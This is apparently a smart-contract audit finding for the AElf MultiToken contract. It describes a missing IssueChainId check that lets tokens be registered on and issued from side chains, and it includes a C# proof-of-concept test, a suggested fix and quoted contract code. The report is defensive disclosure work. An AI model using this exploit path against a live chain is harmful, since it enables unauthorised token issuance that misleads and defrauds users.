# Audit Report

## Title
IssueChainId Manipulation Allows Unauthorized Token Issuance on Side Chains

## Summary
The `Create` method in TokenContract lacks validation that `IssueChainId` must equal the current chain ID. An attacker can create a token on the main chain with `IssueChainId` pointing to a side chain, then register it via `CrossChainCreateToken` and issue tokens directly on the side chain, bypassing side chain creation restrictions.

## Finding Description

The vulnerability exists in the token creation logic where `IssueChainId` validation is missing.

When creating a token, the `CreateToken` method accepts `input.IssueChainId` without validating it equals the current chain: [1](#0-0) 

This line only defaults to `Context.ChainId` when the input is 0, but accepts any other value without validation.

Side chains have a protection mechanism that prevents direct token creation: [2](#0-1) 

This check blocks token creation on side chains where `State.SideChainCreator.Value` is set during initialization: [3](#0-2) 

However, an attacker can bypass this protection through the following attack path:

**Step 1 - Main Chain Token Creation**: Create a token on the main chain with `IssueChainId` set to a side chain's ID. Since `State.SideChainCreator.Value == null` on the main chain, the protection check passes.

**Step 2 - Cross-Chain Registration**: Use `CrossChainCreateToken` to register the token on the side chain: [4](#0-3) 

The side chain accepts the token with its `IssueChainId` pointing to the side chain itself.

**Step 3 - Token Issuance on Side Chain**: Call `Issue` on the side chain. The validation passes because `IssueChainId` matches the side chain's ID: [5](#0-4) 

This breaks the security invariant that tokens should only be issued on their designated chain, and side chains should not have tokens created directly on them.

## Impact Explanation

**Circumvents Side Chain Restrictions**: The protocol explicitly prevents direct token creation on side chains to maintain security and governance control. This vulnerability allows attackers to effectively create and issue tokens on side chains through a backdoor mechanism.

**Supply Inconsistency & Economic Manipulation**: Token supply can be inflated on side chains without corresponding main chain issuance. This breaks cross-chain accounting invariants and violates the intended token economics where tokens should only be issued on their origin chain and transferred via burn/mint mechanisms.

**False Legitimacy**: Tokens created through this exploit appear to have been "officially" registered via `CrossChainCreateToken`, giving them false legitimacy that could deceive users.

**Protocol Integrity Violation**: This directly violates the cross-chain security model where token creation and issuance should be tightly controlled and traceable to their origin chain.

## Likelihood Explanation

**Reachable Entry Point**: The `Create` method is public and accessible to any user with token creation privileges: [6](#0-5) 

**Feasible Preconditions**:
- Attacker needs token creation access on the main chain (via seed NFT purchase or whitelist inclusion - standard requirements)
- Side chain ID is publicly available information
- Cross-chain infrastructure is operational (standard configuration)

**Straightforward Execution**: Each step uses standard, documented contract methods with no complex timing requirements or race conditions. The attack path is deterministic and reproducible.

**Economic Rationality**: The cost (seed NFT + transaction fees) is minimal compared to the benefit (ability to issue unlimited tokens on side chains up to `TotalSupply`), making this highly profitable for malicious actors.

## Recommendation

Add validation in the `CreateToken` method to ensure `IssueChainId` matches the current chain:

```csharp
private Empty CreateToken(CreateInput input, SymbolType symbolType = SymbolType.Token)
{
    AssertValidCreateInput(input, symbolType);
    
    // Add validation for IssueChainId
    if (input.IssueChainId != 0)
    {
        Assert(input.IssueChainId == Context.ChainId, 
            "IssueChainId must match the current chain ID.");
    }
    
    if (symbolType == SymbolType.Token || symbolType == SymbolType.NftCollection)
    {
        Assert(State.SideChainCreator.Value == null,
            "Failed to create token if side chain creator already set.");
        // ... rest of the method
    }
    // ... rest of implementation
}
```

This ensures tokens can only be created with `IssueChainId` equal to the current chain, maintaining the intended cross-chain security model.

## Proof of Concept

```csharp
[Fact]
public async Task IssueChainId_Manipulation_Allows_SideChain_Token_Issuance()
{
    // Setup: Generate side chain
    var sideChainId = await GenerateSideChainAsync();
    await RegisterSideChainContractAddressOnMainChainAsync();
    await BootMinerChangeRoundAsync(AEDPoSContractStub, true);
    
    // Step 1: Main chain - Create token with IssueChainId pointing to side chain
    await CreateSeedNftCollection(TokenContractStub, DefaultAccount.Address);
    var maliciousTokenInput = new CreateInput
    {
        Symbol = "EXPLOIT",
        TokenName = "Exploit Token",
        TotalSupply = 1000000,
        Decimals = 8,
        Issuer = DefaultAccount.Address,
        Owner = DefaultAccount.Address,
        IsBurnable = true,
        IssueChainId = sideChainId  // Set to side chain ID instead of main chain
    };
    await CreateSeedNftAsync(TokenContractStub, maliciousTokenInput, TokenContractAddress);
    var createTx = await TokenContractStub.Create.SendAsync(maliciousTokenInput);
    createTx.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify token was created with side chain IssueChainId
    var tokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput 
    { 
        Symbol = "EXPLOIT" 
    });
    tokenInfo.IssueChainId.ShouldBe(sideChainId);
    
    // Step 2: Main chain - Validate token for cross-chain registration
    var validationTx = TokenContractStub.ValidateTokenInfoExists.GetTransaction(
        new ValidateTokenInfoExistsInput
        {
            Symbol = tokenInfo.Symbol,
            TokenName = tokenInfo.TokenName,
            TotalSupply = tokenInfo.TotalSupply,
            Decimals = tokenInfo.Decimals,
            Issuer = tokenInfo.Issuer,
            IsBurnable = tokenInfo.IsBurnable,
            IssueChainId = tokenInfo.IssueChainId,
            Owner = tokenInfo.Owner,
            ExternalInfo = { tokenInfo.ExternalInfo.Value }
        });
    var blockSet = await MineAsync(new List<Transaction> { validationTx });
    var merklePath = GetTransactionMerklePathAndRoot(validationTx, out var blockRoot);
    
    // Step 3: Side chain - Register token via CrossChainCreateToken
    await IndexMainChainTransactionAsync(blockSet.Height, blockRoot, blockRoot);
    var crossChainInput = new CrossChainCreateTokenInput
    {
        FromChainId = MainChainId,
        ParentChainHeight = blockSet.Height,
        TransactionBytes = validationTx.ToByteString(),
        MerklePath = merklePath
    };
    var registerTx = await SideChainTokenContractStub.CrossChainCreateToken.SendAsync(crossChainInput);
    registerTx.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 4: Side chain - Issue tokens (VULNERABILITY: This should fail but succeeds)
    var issueResult = await SideChainTokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = "EXPLOIT",
        Amount = 100000,
        To = DefaultAccount.Address,
        Memo = "Exploiting IssueChainId manipulation"
    });
    
    // VULNERABILITY DEMONSTRATED: Tokens can be issued on side chain
    issueResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    var sideChainBalance = await SideChainTokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput 
        { 
            Symbol = "EXPLOIT", 
            Owner = DefaultAccount.Address 
        });
    sideChainBalance.Balance.ShouldBe(100000); // Successfully issued tokens on side chain!
}
```

**Notes**

This vulnerability is valid because it bypasses a critical security control: side chains cannot have tokens created directly on them. The attack leverages a missing validation in the `Create` method combined with the cross-chain token registration mechanism. The exploit allows attackers to effectively create and issue tokens on side chains, circumventing the intended restrictions and breaking cross-chain security invariants.

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L14-26)
```csharp
    public override Empty InitializeFromParentChain(InitializeFromParentChainInput input)
    {
        Assert(!State.InitializedFromParentChain.Value, "MultiToken has been initialized");
        State.InitializedFromParentChain.Value = true;
        Assert(input.Creator != null, "creator should not be null");
        foreach (var pair in input.ResourceAmount) State.ResourceAmount[pair.Key] = pair.Value;

        foreach (var pair in input.RegisteredOtherTokenContractAddresses)
            State.CrossChainTransferWhiteList[pair.Key] = pair.Value;

        SetSideChainCreator(input.Creator);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L33-46)
```csharp
    public override Empty Create(CreateInput input)
    {
        var inputSymbolType = GetSymbolType(input.Symbol);
        if (input.Owner == null)
        {
            input.Owner = input.Issuer;
        }
        return inputSymbolType switch
        {
            SymbolType.NftCollection => CreateNFTCollection(input),
            SymbolType.Nft => CreateNFTInfo(input),
            _ => CreateToken(input)
        };
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L54-55)
```csharp
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L76-76)
```csharp
            IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L159-159)
```csharp
        Assert(tokenInfo.IssueChainId == Context.ChainId, "Unable to issue token with wrong chainId.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L478-534)
```csharp
    public override Empty CrossChainCreateToken(CrossChainCreateTokenInput input)
    {
        var tokenContractAddress = State.CrossChainTransferWhiteList[input.FromChainId];
        Assert(tokenContractAddress != null,
            $"Token contract address of chain {ChainHelper.ConvertChainIdToBase58(input.FromChainId)} not registered.");

        var originalTransaction = Transaction.Parser.ParseFrom(input.TransactionBytes);

        AssertCrossChainTransaction(originalTransaction, tokenContractAddress, nameof(ValidateTokenInfoExists));
        var originalTransactionId = originalTransaction.GetHash();
        CrossChainVerify(originalTransactionId, input.ParentChainHeight, input.FromChainId, input.MerklePath);
        var validateTokenInfoExistsInput =
            ValidateTokenInfoExistsInput.Parser.ParseFrom(originalTransaction.Params);
        AssertNftCollectionExist(validateTokenInfoExistsInput.Symbol);
        var tokenInfo = new TokenInfo
        {
            Symbol = validateTokenInfoExistsInput.Symbol,
            TokenName = validateTokenInfoExistsInput.TokenName,
            TotalSupply = validateTokenInfoExistsInput.TotalSupply,
            Decimals = validateTokenInfoExistsInput.Decimals,
            Issuer = validateTokenInfoExistsInput.Issuer,
            IsBurnable = validateTokenInfoExistsInput.IsBurnable,
            IssueChainId = validateTokenInfoExistsInput.IssueChainId,
            ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
            Owner = validateTokenInfoExistsInput.Owner ?? validateTokenInfoExistsInput.Issuer
        };

        var isSymbolAliasSet = SyncSymbolAliasFromTokenInfo(tokenInfo);
        if (State.TokenInfos[tokenInfo.Symbol] == null)
        {
            RegisterTokenInfo(tokenInfo);
            Context.Fire(new TokenCreated
            {
                Symbol = validateTokenInfoExistsInput.Symbol,
                TokenName = validateTokenInfoExistsInput.TokenName,
                TotalSupply = validateTokenInfoExistsInput.TotalSupply,
                Decimals = validateTokenInfoExistsInput.Decimals,
                Issuer = validateTokenInfoExistsInput.Issuer,
                IsBurnable = validateTokenInfoExistsInput.IsBurnable,
                IssueChainId = validateTokenInfoExistsInput.IssueChainId,
                ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
                Owner = tokenInfo.Owner,
            });
        }
        else
        {
            if (isSymbolAliasSet &&
                validateTokenInfoExistsInput.ExternalInfo.TryGetValue(TokenContractConstants.TokenAliasExternalInfoKey,
                    out var tokenAliasSetting))
            {
                State.TokenInfos[tokenInfo.Symbol].ExternalInfo.Value
                    .Add(TokenContractConstants.TokenAliasExternalInfoKey, tokenAliasSetting);
            }
        }

        return new Empty();
    }
```
